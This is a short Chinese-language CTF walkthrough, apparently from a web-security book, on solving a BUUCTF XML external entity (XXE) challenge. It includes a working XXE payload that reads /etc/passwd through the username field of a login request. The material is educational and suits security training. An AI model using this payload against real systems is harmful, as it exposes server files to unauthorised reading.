---
comments: true

---

# XXE注入

<!-- Imported from D:\\Book\\Web\\Chapter16\16-1.md -->
### 文件读取注入

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/67b17bbad0e0a243d4ffc3a1.jpg)

打开网页是登录页面

![](https://pic1.imgdb.cn/item/67b17be9d0e0a243d4ffc3a4.png)

查看网页源代码发现 ajax 发送的是 xml 形式的数据，应该存在 XXE 注入

![](https://pic1.imgdb.cn/item/67b17c04d0e0a243d4ffc3a9.jpg)

打开 BurpSuite 抓包请求确定是 xml 格式

![](https://pic1.imgdb.cn/item/67b17c74d0e0a243d4ffc3e9.jpg)

构造 payload，如图中的 xml 格式

第一行先声明 XML 的版本（1.0）和编码（UTF-8）

然后声明 DOCTYPE，名字自取

然后再声明 ENTITY，名字自取

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
    <!ENTITY admin SYSTEM "file:///etc/passwd">
    ]>
<user>
    <username>
        &admin;
    </username>
    <password>
        123
    </password>
</user>
```

SYSTEM 标识符表示外部实体引用一个外部资源，可以是文件或 URL，传过去拿到 flag

![](https://pic1.imgdb.cn/item/67b17d15d0e0a243d4ffc3f8.jpg)
